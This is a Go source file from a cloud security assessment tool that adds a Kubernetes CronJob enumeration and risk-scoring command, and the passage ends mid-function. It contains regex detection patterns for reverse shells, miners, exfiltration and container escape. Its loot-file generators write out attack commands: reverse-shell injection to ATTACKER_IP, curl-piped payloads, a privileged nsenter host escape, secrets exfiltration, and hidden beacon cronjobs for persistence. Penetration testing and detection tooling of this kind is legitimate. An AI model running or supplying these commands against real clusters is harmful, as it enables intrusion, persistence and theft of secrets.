package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"regexp"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

var CronJobsCmd = &cobra.Command{
	Use:     "cronjobs",
	Aliases: []string{"cj"},
	Short:   "List all cluster CronJobs",
	Long: `
List all cluster CronJobs:
  cloudfox kubernetes cronjobs`,
	Run: ListCronJobs,
}

type CronJobsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t CronJobsOutput) TableFiles() []internal.TableFile { return t.Table }
func (t CronJobsOutput) LootFiles() []internal.LootFile   { return t.Loot }

type CronJobFinding struct {
	Namespace              string
	Name                   string
	Schedule               string
	RiskLevel              string
	RiskScore              int
	SecurityIssues         []string
	Suspend                bool
	ConcurrencyPolicy      string
	BackdoorPatterns       []string
	ReverseShells          []string
	CryptoMiners           []string
	DataExfiltration       []string
	ContainerEscape        []string
	ScheduleAnalysis       string
	SuccessfulJobsHistory  int32
	FailedJobsHistory      int32
	ServiceAccount         string
	Containers             []string
	ImageRegistry          string
	ImageTags              []string
	HostPID                bool
	HostIPC                bool
	HostNetwork            bool
	Privileged             bool
	HostPaths              []string
	Volumes                []string
	Labels                 map[string]string
	Annotations            map[string]string
	CloudProvider          string
	CloudRole              string
	Commands               []string
	Args                   []string
	EnvVars                []string
	CreationTimestamp      string
}

func ListCronJobs(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	// Extract global flags
	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating cronjobs for %s", globals.ClusterName), globals.K8S_CRONJOBS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	cronJobs, err := clientset.BatchV1().CronJobs("").List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing CronJobs: %v", err), globals.K8S_CRONJOBS_MODULE_NAME)
		return
	}

	headers := []string{
		"Risk Level", "Namespace", "Name", "Schedule", "Schedule Analysis",
		"Backdoor Patterns", "Reverse Shells", "Crypto Miners", "Data Exfiltration", "Container Escape",
		"Concurrency Policy", "Suspend",
		"Successful Jobs History", "Failed Jobs History",
		"Service Account", "Containers", "Volumes",
		"HostPID", "HostIPC", "HostNetwork", "Privileged", "HostPaths",
		"Cloud Provider", "Cloud Role",
	}

	var outputRows [][]string
	var findings []CronJobFinding

	// Risk counters
	var criticalCount, highCount, mediumCount, lowCount int

	for _, cj := range cronJobs.Items {
		podSpec := cj.Spec.JobTemplate.Spec.Template.Spec

		// Get success/failed history limits with defaults
		successHistory := int32(3)
		failedHistory := int32(1)
		if cj.Spec.SuccessfulJobsHistoryLimit != nil {
			successHistory = *cj.Spec.SuccessfulJobsHistoryLimit
		}
		if cj.Spec.FailedJobsHistoryLimit != nil {
			failedHistory = *cj.Spec.FailedJobsHistoryLimit
		}

		suspend := false
		if cj.Spec.Suspend != nil {
			suspend = *cj.Spec.Suspend
		}

		// Run comprehensive security analysis
		finding := analyzeCronJobSecurity(
			ctx,
			clientset,
			cj.Namespace,
			cj.Name,
			cj.Spec.Schedule,
			suspend,
			string(cj.Spec.ConcurrencyPolicy),
			successHistory,
			failedHistory,
			podSpec,
			cj.Spec.JobTemplate.Spec.Template.Annotations,
		)

		findings = append(findings, finding)

		// Count risk levels
		switch finding.RiskLevel {
		case "CRITICAL":
			criticalCount++
		case "HIGH":
			highCount++
		case "MEDIUM":
			mediumCount++
		case "LOW":
			lowCount++
		}

		// Format findings for table
		backdoorPatternsStr := strings.Join(finding.BackdoorPatterns, "; ")
		reverseShellsStr := strings.Join(finding.ReverseShells, "; ")
		cryptoMinersStr := strings.Join(finding.CryptoMiners, "; ")
		dataExfilStr := strings.Join(finding.DataExfiltration, "; ")
		containerEscapeStr := strings.Join(finding.ContainerEscape, "; ")
		containersStr := strings.Join(finding.Containers, ", ")
		volumesStr := strings.Join(finding.Volumes, ", ")
		hostPathsStr := strings.Join(finding.HostPaths, "; ")

		row := []string{
			finding.RiskLevel,
			finding.Namespace,
			finding.Name,
			finding.Schedule,
			finding.ScheduleAnalysis,
			k8sinternal.NonEmpty(backdoorPatternsStr),
			k8sinternal.NonEmpty(reverseShellsStr),
			k8sinternal.NonEmpty(cryptoMinersStr),
			k8sinternal.NonEmpty(dataExfilStr),
			k8sinternal.NonEmpty(containerEscapeStr),
			finding.ConcurrencyPolicy,
			fmt.Sprintf("%v", finding.Suspend),
			fmt.Sprintf("%d", finding.SuccessfulJobsHistory),
			fmt.Sprintf("%d", finding.FailedJobsHistory),
			k8sinternal.NonEmpty(finding.ServiceAccount),
			k8sinternal.NonEmpty(containersStr),
			k8sinternal.NonEmpty(volumesStr),
			k8sinternal.SafeBool(finding.HostPID),
			k8sinternal.SafeBool(finding.HostIPC),
			k8sinternal.SafeBool(finding.HostNetwork),
			fmt.Sprintf("%v", finding.Privileged),
			k8sinternal.NonEmpty(hostPathsStr),
			k8sinternal.NonEmpty(finding.CloudProvider),
			k8sinternal.NonEmpty(finding.CloudRole),
		}
		outputRows = append(outputRows, row)
	}

	// Generate comprehensive loot files
	lootFiles := generateCronJobLoot(findings, globals.KubeContext)

	table := internal.TableFile{Name: "CronJobs", Header: headers, Body: outputRows}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"CronJobs",
		globals.ClusterName,
		"results",
		CronJobsOutput{Table: []internal.TableFile{table}, Loot: lootFiles},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_CRONJOBS_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d cronjobs found", len(outputRows)), globals.K8S_CRONJOBS_MODULE_NAME)
		logger.InfoM(fmt.Sprintf("Risk Summary: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
			criticalCount, highCount, mediumCount, lowCount), globals.K8S_CRONJOBS_MODULE_NAME)

		if criticalCount > 0 {
			logger.InfoM(fmt.Sprintf("⚠️  %d CRITICAL risk cronjobs detected! Check CronJob-Suspicious loot file", criticalCount), globals.K8S_CRONJOBS_MODULE_NAME)
		}
		if highCount > 0 {
			logger.InfoM(fmt.Sprintf("⚠️  %d HIGH risk cronjobs detected! Check CronJob-Suspicious loot file", highCount), globals.K8S_CRONJOBS_MODULE_NAME)
		}
	} else {
		logger.InfoM("No cronjobs found, skipping output file creation", globals.K8S_CRONJOBS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_CRONJOBS_MODULE_NAME), globals.K8S_CRONJOBS_MODULE_NAME)
}

// --- local formatters ---
func formatAffinity(affinity *v1.Affinity) string {
	if affinity == nil {
		return ""
	}
	b, err := json.Marshal(affinity)
	if err != nil {
		return ""
	}
	return string(b)
}

func formatTolerations(tols []v1.Toleration) string {
	if len(tols) == 0 {
		return ""
	}
	b, err := json.Marshal(tols)
	if err != nil {
		return ""
	}
	return string(b)
}

// --- Security Analysis Functions ---

func detectReverseShells(commands []string, args []string) []string {
	var findings []string
	patterns := []struct {
		regex *regexp.Regexp
		desc  string
	}{
		{regexp.MustCompile(`bash\s+-i\s+>&\s+/dev/tcp/`), "Bash TCP reverse shell"},
		{regexp.MustCompile(`bash\s+-i\s+>&\s+/dev/udp/`), "Bash UDP reverse shell"},
		{regexp.MustCompile(`nc\s+-e\s+/bin/(bash|sh)`), "Netcat reverse shell"},
		{regexp.MustCompile(`nc\s+.*\s+-e\s+/bin/(bash|sh)`), "Netcat reverse shell with options"},
		{regexp.MustCompile(`mkfifo\s+/tmp/[a-z];.*nc\s+`), "Named pipe reverse shell"},
		{regexp.MustCompile(`python.*socket.*subprocess`), "Python reverse shell"},
		{regexp.MustCompile(`perl.*socket.*open\(STDIN`), "Perl reverse shell"},
		{regexp.MustCompile(`ruby.*socket.*exec`), "Ruby reverse shell"},
		{regexp.MustCompile(`php.*fsockopen.*exec`), "PHP reverse shell"},
		{regexp.MustCompile(`socat.*exec:.*pty`), "Socat reverse shell"},
		{regexp.MustCompile(`ncat.*--sh-exec`), "Ncat reverse shell"},
		{regexp.MustCompile(`telnet.*\|.*bin/(bash|sh)`), "Telnet reverse shell"},
	}

	allText := strings.Join(append(commands, args...), " ")
	for _, p := range patterns {
		if p.regex.MatchString(allText) {
			findings = append(findings, p.desc)
		}
	}
	return findings
}

func detectCryptoMiners(commands []string, args []string, images []string) []string {
	var findings []string
	patterns := []struct {
		regex *regexp.Regexp
		desc  string
	}{
		{regexp.MustCompile(`(?i)xmrig`), "XMRig crypto miner"},
		{regexp.MustCompile(`(?i)minerd`), "CPU miner (minerd)"},
		{regexp.MustCompile(`(?i)cpuminer`), "CPU miner"},
		{regexp.MustCompile(`(?i)stratum\+tcp://`), "Stratum mining pool connection"},
		{regexp.MustCompile(`(?i)--donate-level`), "Miner donation level flag"},
		{regexp.MustCompile(`(?i)--coin=monero`), "Monero mining"},
		{regexp.MustCompile(`(?i)--coin=ethereum`), "Ethereum mining"},
		{regexp.MustCompile(`(?i)--algo=cryptonight`), "CryptoNight algorithm mining"},
		{regexp.MustCompile(`(?i)ethminer`), "Ethereum miner"},
		{regexp.MustCompile(`(?i)claymore`), "Claymore miner"},
		{regexp.MustCompile(`(?i)phoenixminer`), "PhoenixMiner"},
		{regexp.MustCompile(`(?i)t-rex`), "T-Rex miner"},
		{regexp.MustCompile(`(?i)--pool=`), "Mining pool configuration"},
		{regexp.MustCompile(`(?i)--wallet=`), "Crypto wallet address"},
		{regexp.MustCompile(`(?i)--user=.*\.(worker|miner)`), "Mining worker configuration"},
	}

	allText := strings.Join(append(append(commands, args...), images...), " ")
	for _, p := range patterns {
		if p.regex.MatchString(allText) {
			findings = append(findings, p.desc)
		}
	}
	return findings
}

func detectDataExfiltration(commands []string, args []string) []string {
	var findings []string
	patterns := []struct {
		regex *regexp.Regexp
		desc  string
	}{
		{regexp.MustCompile(`curl.*http.*\|.*bash`), "Curl pipe to bash (potential backdoor download)"},
		{regexp.MustCompile(`wget.*http.*\|.*bash`), "Wget pipe to bash (potential backdoor download)"},
		{regexp.MustCompile(`curl.*-X\s+POST.*--data`), "HTTP POST with data (potential exfiltration)"},
		{regexp.MustCompile(`base64.*\|.*curl`), "Base64 encode and curl (data exfiltration)"},
		{regexp.MustCompile(`tar.*\|.*curl.*-T`), "Tar and upload via curl"},
		{regexp.MustCompile(`aws\s+s3\s+cp.*s3://(?!internal)`), "AWS S3 copy to external bucket"},
		{regexp.MustCompile(`gsutil\s+cp.*gs://`), "GCP Cloud Storage upload"},
		{regexp.MustCompile(`kubectl\s+cp.*:.*\.`), "kubectl cp from pod (data extraction)"},
		{regexp.MustCompile(`scp.*@.*:`), "SCP file transfer"},
		{regexp.MustCompile(`rsync.*@.*:`), "Rsync file transfer"},
		{regexp.MustCompile(`nc.*>.*\.(zip|tar|gz|tgz)`), "Netcat file transfer"},
		{regexp.MustCompile(`find\s+/.*-name.*\|.*curl`), "Find files and exfiltrate"},
		{regexp.MustCompile(`cat\s+/etc/shadow.*\|`), "Shadow file access and pipe"},
		{regexp.MustCompile(`cat\s+/etc/passwd.*\|`), "Passwd file access and pipe"},
		{regexp.MustCompile(`env.*\|.*curl`), "Environment variable exfiltration"},
	}

	allText := strings.Join(append(commands, args...), " ")
	for _, p := range patterns {
		if p.regex.MatchString(allText) {
			findings = append(findings, p.desc)
		}
	}
	return findings
}

func detectContainerEscape(commands []string, args []string, hostPaths []string) []string {
	var findings []string
	patterns := []struct {
		regex *regexp.Regexp
		desc  string
	}{
		{regexp.MustCompile(`nsenter\s+--target\s+1`), "nsenter escape to host PID namespace"},
		{regexp.MustCompile(`nsenter.*--mount.*--uts.*--ipc.*--net.*--pid`), "nsenter full namespace escape"},
		{regexp.MustCompile(`docker\.sock`), "Docker socket access (container escape vector)"},
		{regexp.MustCompile(`containerd\.sock`), "Containerd socket access (container escape vector)"},
		{regexp.MustCompile(`crio\.sock`), "CRI-O socket access (container escape vector)"},
		{regexp.MustCompile(`runc`), "runc binary (potential container escape)"},
		{regexp.MustCompile(`ctr\s+`), "containerd CLI (container runtime access)"},
		{regexp.MustCompile(`crictl`), "CRI CLI (container runtime access)"},
		{regexp.MustCompile(`mount.*proc.*sys`), "Proc/sys mount (escape technique)"},
		{regexp.MustCompile(`unshare`), "unshare namespace manipulation"},
	}

	allText := strings.Join(append(commands, args...), " ")
	for _, p := range patterns {
		if p.regex.MatchString(allText) {
			findings = append(findings, p.desc)
		}
	}

	// Check hostPath mounts for container runtime sockets
	for _, hp := range hostPaths {
		if strings.Contains(hp, "docker.sock") {
			findings = append(findings, "HostPath: docker.sock mounted (critical escape vector)")
		}
		if strings.Contains(hp, "containerd.sock") {
			findings = append(findings, "HostPath: containerd.sock mounted (critical escape vector)")
		}
		if strings.Contains(hp, "/var/run") {
			findings = append(findings, "HostPath: /var/run mounted (potential socket access)")
		}
		if hp == "/" || hp == "/host" {
			findings = append(findings, "HostPath: root filesystem mounted (critical escape vector)")
		}
	}

	return findings
}

func analyzeSchedule(schedule string) (string, string) {
	// Returns (analysis string, risk level)
	// Cron format: minute hour day month weekday
	parts := strings.Fields(schedule)
	if len(parts) < 5 {
		return "Invalid schedule format", "UNKNOWN"
	}

	minute := parts[0]
	hour := parts[1]

	// CRITICAL: Every minute (crypto miner pattern)
	if schedule == "* * * * *" {
		return "Runs EVERY MINUTE - typical crypto miner behavior", "CRITICAL"
	}

	// CRITICAL: Every 2-5 minutes
	if minute == "*/2" || minute == "*/3" || minute == "*/4" || minute == "*/5" {
		return fmt.Sprintf("Runs every %s minutes - very frequent execution", minute), "HIGH"
	}

	// HIGH: Off-hours execution (2am - 5am) - backdoor/exfiltration pattern
	if hour == "2" || hour == "3" || hour == "4" {
		return fmt.Sprintf("Runs at %s:00 (off-hours) - potential backdoor or exfiltration", hour), "HIGH"
	}

	// MEDIUM: Every 10-15 minutes
	if minute == "*/10" || minute == "*/15" {
		return "Runs every 10-15 minutes - frequent execution", "MEDIUM"
	}

	// MEDIUM: Multiple times per hour
	if strings.Contains(minute, ",") && len(strings.Split(minute, ",")) >= 4 {
		return "Runs multiple times per hour", "MEDIUM"
	}

	// LOW: Normal schedule
	return "Normal schedule pattern", "LOW"
}

func analyzeCronJobSecurity(
	ctx context.Context,
	clientset *kubernetes.Clientset,
	namespace string,
	name string,
	schedule string,
	suspend bool,
	concurrencyPolicy string,
	successHistory int32,
	failedHistory int32,
	podSpec v1.PodSpec,
	annotations map[string]string,
) CronJobFinding {

	finding := CronJobFinding{
		Namespace:             namespace,
		Name:                  name,
		Schedule:              schedule,
		Suspend:               suspend,
		ConcurrencyPolicy:     concurrencyPolicy,
		SuccessfulJobsHistory: successHistory,
		FailedJobsHistory:     failedHistory,
		ServiceAccount:        podSpec.ServiceAccountName,
		HostPID:               podSpec.HostPID,
		HostIPC:               podSpec.HostIPC,
		HostNetwork:           podSpec.HostNetwork,
		Labels:                annotations, // Using annotations as labels for now
		Annotations:           annotations,
	}

	// Extract containers, commands, args, images
	var containers []string
	var allCommands []string
	var allArgs []string
	var allImages []string
	var allEnvVars []string
	privileged := false

	for _, c := range podSpec.Containers {
		containers = append(containers, fmt.Sprintf("%s:%s", c.Name, c.Image))
		allImages = append(allImages, c.Image)
		allCommands = append(allCommands, c.Command...)
		allArgs = append(allArgs, c.Args...)

		// Check for privileged
		if c.SecurityContext != nil && c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
			privileged = true
		}

		// Collect environment variables
		for _, env := range c.Env {
			if env.Value != "" {
				allEnvVars = append(allEnvVars, fmt.Sprintf("%s=%s", env.Name, env.Value))
			}
		}
	}

	finding.Containers = containers
	finding.Commands = allCommands
	finding.Args = allArgs
	finding.Privileged = privileged
	finding.EnvVars = allEnvVars

	// Extract image registry and tags
	if len(allImages) > 0 {
		// Get registry from first image
		img := allImages[0]
		if strings.Contains(img, "/") {
			parts := strings.Split(img, "/")
			finding.ImageRegistry = parts[0]
		}

		// Extract tags
		for _, img := range allImages {
			if strings.Contains(img, ":") {
				tag := strings.Split(img, ":")[1]
				finding.ImageTags = append(finding.ImageTags, tag)
			}
		}
	}

	// Extract volumes and hostPaths
	var volumes []string
	var hostPaths []string
	for _, v := range podSpec.Volumes {
		volumes = append(volumes, v.Name)
		if v.HostPath != nil {
			mountPoint := k8sinternal.FindMountPath(v.Name, podSpec.Containers)
			hostPaths = append(hostPaths, fmt.Sprintf("%s:%s", v.HostPath.Path, mountPoint))
		}
	}
	finding.Volumes = volumes
	finding.HostPaths = hostPaths

	// Cloud role detection
	if podSpec.ServiceAccountName != "" {
		roleResults := k8sinternal.DetectCloudRole(
			ctx,
			clientset,
			namespace,
			podSpec.ServiceAccountName,
			&podSpec,
			annotations,
		)
		if len(roleResults) > 0 {
			finding.CloudProvider = roleResults[0].Provider
			finding.CloudRole = roleResults[0].Role
		}
	}

	// Run security detection
	finding.ReverseShells = detectReverseShells(allCommands, allArgs)
	finding.CryptoMiners = detectCryptoMiners(allCommands, allArgs, allImages)
	finding.DataExfiltration = detectDataExfiltration(allCommands, allArgs)
	finding.ContainerEscape = detectContainerEscape(allCommands, allArgs, hostPaths)

	// Combine all backdoor patterns
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ReverseShells...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.CryptoMiners...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.DataExfiltration...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ContainerEscape...)

	// Schedule analysis
	scheduleAnalysis, scheduleRisk := analyzeSchedule(schedule)
	finding.ScheduleAnalysis = scheduleAnalysis

	// Calculate risk level
	finding.RiskLevel = calculateCronJobRiskLevel(finding, scheduleRisk)

	// Calculate risk score (0-100)
	finding.RiskScore = calculateCronJobRiskScore(finding, scheduleRisk)

	// Generate security issues
	finding.SecurityIssues = generateCronJobSecurityIssues(finding, scheduleRisk)

	return finding
}

func calculateCronJobRiskLevel(finding CronJobFinding, scheduleRisk string) string {
	// CRITICAL: Active backdoors, reverse shells, crypto miners
	if len(finding.ReverseShells) > 0 {
		return "CRITICAL"
	}
	if len(finding.CryptoMiners) > 0 {
		return "CRITICAL"
	}
	if len(finding.ContainerEscape) > 0 && (finding.HostPID || finding.HostIPC || finding.Privileged) {
		return "CRITICAL"
	}
	if scheduleRisk == "CRITICAL" && len(finding.BackdoorPatterns) > 0 {
		return "CRITICAL"
	}

	// HIGH: Data exfiltration, container escape vectors, privileged + hostPath
	if len(finding.DataExfiltration) > 0 {
		return "HIGH"
	}
	if len(finding.ContainerEscape) > 0 {
		return "HIGH"
	}
	if finding.Privileged && len(finding.HostPaths) > 0 {
		return "HIGH"
	}
	if finding.HostPID || finding.HostIPC {
		return "HIGH"
	}
	if scheduleRisk == "HIGH" {
		return "HIGH"
	}

	// MEDIUM: HostNetwork, suspicious schedules, cloud roles
	if finding.HostNetwork {
		return "MEDIUM"
	}
	if scheduleRisk == "MEDIUM" {
		return "MEDIUM"
	}
	if finding.CloudRole != "" && finding.CloudRole != "<NONE>" {
		return "MEDIUM"
	}
	if finding.Privileged {
		return "MEDIUM"
	}

	// LOW: Standard cronjob
	return "LOW"
}

func generateCronJobLoot(findings []CronJobFinding, kubeContext string) []internal.LootFile {
	var lootFiles []internal.LootFile

	// Separate findings by risk level
	var critical, high, medium, low []CronJobFinding
	for _, f := range findings {
		switch f.RiskLevel {
		case "CRITICAL":
			critical = append(critical, f)
		case "HIGH":
			high = append(high, f)
		case "MEDIUM":
			medium = append(medium, f)
		case "LOW":
			low = append(low, f)
		}
	}

	// Sort each group by namespace, then name
	sortFindings := func(findings []CronJobFinding) {
		sort.Slice(findings, func(i, j int) bool {
			if findings[i].Namespace != findings[j].Namespace {
				return findings[i].Namespace < findings[j].Namespace
			}
			return findings[i].Name < findings[j].Name
		})
	}
	sortFindings(critical)
	sortFindings(high)
	sortFindings(medium)
	sortFindings(low)

	// 1. CronJob-Enum: Basic enumeration commands
	var enumLines []string
	enumLines = append(enumLines, "########################################")
	enumLines = append(enumLines, "##### CronJob Enumeration Commands")
	enumLines = append(enumLines, "########################################\n")
	if kubeContext != "" {
		enumLines = append(enumLines, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
	}
	enumLines = append(enumLines, "# List all cronjobs across all namespaces")
	enumLines = append(enumLines, "kubectl get cronjobs -A\n")
	enumLines = append(enumLines, "# Get detailed information for all cronjobs")
	enumLines = append(enumLines, "kubectl get cronjobs -A -o wide\n")

	for _, f := range findings {
		enumLines = append(enumLines, fmt.Sprintf("\n# Namespace: %s | CronJob: %s | Risk: %s", f.Namespace, f.Name, f.RiskLevel))
		enumLines = append(enumLines, fmt.Sprintf("kubectl get cronjob -n %s %s -o yaml", f.Namespace, f.Name))
		enumLines = append(enumLines, fmt.Sprintf("kubectl describe cronjob -n %s %s", f.Namespace, f.Name))

		// Add job listing
		enumLines = append(enumLines, fmt.Sprintf("# List jobs created by this cronjob"))
		enumLines = append(enumLines, fmt.Sprintf("kubectl get jobs -n %s -l job-name=%s", f.Namespace, f.Name))
	}

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "CronJob-Enum",
		Contents: strings.Join(enumLines, "\n"),
	})

	// 2. CronJob-Suspicious: High-risk findings with backdoor patterns
	var suspiciousLines []string
	suspiciousLines = append(suspiciousLines, "########################################")
	suspiciousLines = append(suspiciousLines, "##### Suspicious CronJobs Analysis")
	suspiciousLines = append(suspiciousLines, "########################################\n")
	suspiciousLines = append(suspiciousLines, fmt.Sprintf("# CRITICAL Risk: %d cronjobs", len(critical)))
	suspiciousLines = append(suspiciousLines, fmt.Sprintf("# HIGH Risk: %d cronjobs", len(high)))
	suspiciousLines = append(suspiciousLines, fmt.Sprintf("# MEDIUM Risk: %d cronjobs\n", len(medium)))

	if len(critical) > 0 {
		suspiciousLines = append(suspiciousLines, "\n=== CRITICAL RISK CRONJOBS ===\n")
		for _, f := range critical {
			suspiciousLines = append(suspiciousLines, fmt.Sprintf("Namespace: %s", f.Namespace))
			suspiciousLines = append(suspiciousLines, fmt.Sprintf("Name: %s", f.Name))
			suspiciousLines = append(suspiciousLines, fmt.Sprintf("Schedule: %s", f.Schedule))
			suspiciousLines = append(suspiciousLines, fmt.Sprintf("Schedule Analysis: %s", f.ScheduleAnalysis))

			if len(f.BackdoorPatterns) > 0 {
				suspiciousLines = append(suspiciousLines, "\nBACKDOOR PATTERNS DETECTED:")
				for _, bp := range f.BackdoorPatterns {
					suspiciousLines = append(suspiciousLines, fmt.Sprintf("  - %s", bp))
				}
			}

			if len(f.Commands) > 0 {
				suspiciousLines = append(suspiciousLines, fmt.Sprintf("\nCommands: %s", strings.Join(f.Commands, " ")))
			}
			if len(f.Args) > 0 {
				suspiciousLines = append(suspiciousLines, fmt.Sprintf("Args: %s", strings.Join(f.Args, " ")))
			}

			suspiciousLines = append(suspiciousLines, fmt.Sprintf("Containers: %s", strings.Join(f.Containers, ", ")))
			suspiciousLines = append(suspiciousLines, fmt.Sprintf("HostPID: %v | HostIPC: %v | HostNetwork: %v | Privileged: %v",
				f.HostPID, f.HostIPC, f.HostNetwork, f.Privileged))

			if len(f.HostPaths) > 0 {
				suspiciousLines = append(suspiciousLines, fmt.Sprintf("HostPaths: %s", strings.Join(f.HostPaths, ", ")))
			}

			suspiciousLines = append(suspiciousLines, "\n---")
		}
	}

	if len(high) > 0 {
		suspiciousLines = append(suspiciousLines, "\n=== HIGH RISK CRONJOBS ===\n")
		for _, f := range high {
			suspiciousLines = append(suspiciousLines, fmt.Sprintf("%s/%s - %s", f.Namespace, f.Name, f.Schedule))
			suspiciousLines = append(suspiciousLines, fmt.Sprintf("  Analysis: %s", f.ScheduleAnalysis))
			if len(f.BackdoorPatterns) > 0 {
				suspiciousLines = append(suspiciousLines, fmt.Sprintf("  Patterns: %s", strings.Join(f.BackdoorPatterns, ", ")))
			}
			suspiciousLines = append(suspiciousLines, "")
		}
	}

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "CronJob-Suspicious",
		Contents: strings.Join(suspiciousLines, "\n"),
	})

	// 3. CronJob-Exploitation: Exploitation techniques
	var exploitLines []string
	exploitLines = append(exploitLines, "########################################")
	exploitLines = append(exploitLines, "##### CronJob Exploitation Techniques")
	exploitLines = append(exploitLines, "########################################\n")

	exploitLines = append(exploitLines, "=== BACKDOOR INJECTION TECHNIQUES ===\n")
	exploitLines = append(exploitLines, "# 1. Modify existing cronjob to add reverse shell")
	exploitLines = append(exploitLines, "kubectl patch cronjob <name> -n <namespace> -p '{\"spec\":{\"jobTemplate\":{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"<container>\",\"command\":[\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"]}]}}}}}'\n")

	exploitLines = append(exploitLines, "# 2. Create malicious cronjob (every minute)")
	exploitLines = append(exploitLines, "cat <<EOF | kubectl apply -f -")
	exploitLines = append(exploitLines, "apiVersion: batch/v1")
	exploitLines = append(exploitLines, "kind: CronJob")
	exploitLines = append(exploitLines, "metadata:")
	exploitLines = append(exploitLines, "  name: malicious-cronjob")
	exploitLines = append(exploitLines, "  namespace: default")
	exploitLines = append(exploitLines, "spec:")
	exploitLines = append(exploitLines, "  schedule: \"* * * * *\"")
	exploitLines = append(exploitLines, "  jobTemplate:")
	exploitLines = append(exploitLines, "    spec:")
	exploitLines = append(exploitLines, "      template:")
	exploitLines = append(exploitLines, "        spec:")
	exploitLines = append(exploitLines, "          containers:")
	exploitLines = append(exploitLines, "          - name: backdoor")
	exploitLines = append(exploitLines, "            image: alpine:latest")
	exploitLines = append(exploitLines, "            command: [\"/bin/sh\", \"-c\"]")
	exploitLines = append(exploitLines, "            args: [\"curl http://ATTACKER_IP/payload.sh | sh\"]")
	exploitLines = append(exploitLines, "          restartPolicy: OnFailure")
	exploitLines = append(exploitLines, "EOF\n")

	exploitLines = append(exploitLines, "# 3. Privileged cronjob with host access (container escape)")
	exploitLines = append(exploitLines, "cat <<EOF | kubectl apply -f -")
	exploitLines = append(exploitLines, "apiVersion: batch/v1")
	exploitLines = append(exploitLines, "kind: CronJob")
	exploitLines = append(exploitLines, "metadata:")
	exploitLines = append(exploitLines, "  name: host-escape")
	exploitLines = append(exploitLines, "  namespace: default")
	exploitLines = append(exploitLines, "spec:")
	exploitLines = append(exploitLines, "  schedule: \"0 2 * * *\"")
	exploitLines = append(exploitLines, "  jobTemplate:")
	exploitLines = append(exploitLines, "    spec:")
	exploitLines = append(exploitLines, "      template:")
	exploitLines = append(exploitLines, "        spec:")
	exploitLines = append(exploitLines, "          hostPID: true")
	exploitLines = append(exploitLines, "          hostNetwork: true")
	exploitLines = append(exploitLines, "          containers:")
	exploitLines = append(exploitLines, "          - name: escape")
	exploitLines = append(exploitLines, "            image: alpine:latest")
	exploitLines = append(exploitLines, "            securityContext:")
	exploitLines = append(exploitLines, "              privileged: true")
	exploitLines = append(exploitLines, "            command: [\"/bin/sh\", \"-c\"]")
	exploitLines = append(exploitLines, "            args: [\"nsenter --target 1 --mount --uts --ipc --net --pid -- bash -i\"]")
	exploitLines = append(exploitLines, "            volumeMounts:")
	exploitLines = append(exploitLines, "            - mountPath: /host")
	exploitLines = append(exploitLines, "              name: host")
	exploitLines = append(exploitLines, "          volumes:")
	exploitLines = append(exploitLines, "          - name: host")
	exploitLines = append(exploitLines, "            hostPath:")
	exploitLines = append(exploitLines, "              path: /")
	exploitLines = append(exploitLines, "          restartPolicy: OnFailure")
	exploitLines = append(exploitLines, "EOF\n")

	exploitLines = append(exploitLines, "\n=== CRYPTO MINER DEPLOYMENT ===\n")
	exploitLines = append(exploitLines, "# Deploy crypto miner cronjob")
	exploitLines = append(exploitLines, "kubectl create cronjob miner --image=alpine --schedule=\"* * * * *\" -- sh -c 'wget -O - http://POOL/miner.sh | sh'\n")

	exploitLines = append(exploitLines, "\n=== DATA EXFILTRATION ===\n")
	exploitLines = append(exploitLines, "# Exfiltrate secrets via cronjob")
	exploitLines = append(exploitLines, "kubectl create cronjob exfil --image=alpine --schedule=\"0 3 * * *\" -- sh -c 'kubectl get secrets -A -o json | curl -X POST -d @- http://ATTACKER_IP/secrets'\n")

	lootFiles = append(lootFiles, internal.LootFile{
		Name:     "CronJob-Exploitation",
		Contents: strings.Join(exploitLines, "\n"),
	})

	// 4. CronJob-Persistence: Persistence mechanisms
	var persistLines []string
	persistLines = append(persistLines, "########################################")
	persistLines = append(persistLines, "##### CronJob Persistence Mechanisms")
	persistLines = append(persistLines, "########################################\n")

	persistLines = append(persistLines, "=== DETECTION EVASION ===\n")
	persistLines = append(persistLines, "# 1. Use suspended cronjob as dormant backdoor")
	persistLines = append(persistLines, "kubectl patch cronjob <name> -n <namespace> -p '{\"spec\":{\"suspend\":true}}'\n")

	persistLines = append(persistLines, "# 2. Hide in system namespaces with innocuous names")
	persistLines = append(persistLines, "kubectl create cronjob kube-system-check -n kube-system --image=alpine --schedule=\"0 4 * * *\" -- sh -c 'curl http://c2/beacon'\n")

